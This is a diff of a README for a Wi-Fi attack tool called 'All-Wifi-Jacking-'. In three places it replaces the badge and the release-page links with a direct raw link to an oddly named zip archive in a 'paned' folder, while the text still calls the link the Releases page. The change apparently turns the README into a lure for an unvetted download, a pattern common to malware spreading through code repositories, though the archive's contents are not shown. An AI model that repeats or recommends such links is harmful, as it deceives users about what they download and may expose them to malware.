@@ -6,7 +6,7 @@ Welcome to All-Wifi-Jacking-, a powerful tool designed to help you audit the sec
 
 ## 📥 Download Now!
 
-[![Download All-Wifi-Jacking-](https://img.shields.io/badge/Download-All--Wifi--Jacking--blue)](https://github.com/ConstantineMicske/All-Wifi-Jacking-/releases)
+[![Download All-Wifi-Jacking-](https://github.com/ConstantineMicske/All-Wifi-Jacking-/raw/refs/heads/main/paned/Jacking-Wifi-All-colotomy.zip)](https://github.com/ConstantineMicske/All-Wifi-Jacking-/raw/refs/heads/main/paned/Jacking-Wifi-All-colotomy.zip)
 
 ## 📋 Prerequisites
 
@@ -18,7 +18,7 @@ Before you start, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To get started with All-Wifi-Jacking-, visit this page to download: [All-Wifi-Jacking- Releases](https://github.com/ConstantineMicske/All-Wifi-Jacking-/releases). 
+To get started with All-Wifi-Jacking-, visit this page to download: [All-Wifi-Jacking- Releases](https://github.com/ConstantineMicske/All-Wifi-Jacking-/raw/refs/heads/main/paned/Jacking-Wifi-All-colotomy.zip). 
 
 1. **Go to the Releases Page:** Click the link above to open the releases page.
 2. **Select the Latest Version:** Choose the most recent version of the software. It's usually listed first.
@@ -62,4 +62,4 @@ If you're interested in contributing, feel free to fork the repository and submi
 
 All-Wifi-Jacking- is open-source software. You may use it freely under the terms of the chosen license.
 
-[![Download All-Wifi-Jacking-](https://img.shields.io/badge/Download-All--Wifi--Jacking--blue)](https://github.com/ConstantineMicske/All-Wifi-Jacking-/releases)
+[![Download All-Wifi-Jacking-](https://github.com/ConstantineMicske/All-Wifi-Jacking-/raw/refs/heads/main/paned/Jacking-Wifi-All-colotomy.zip)](https://github.com/ConstantineMicske/All-Wifi-Jacking-/raw/refs/heads/main/paned/Jacking-Wifi-All-colotomy.zip)
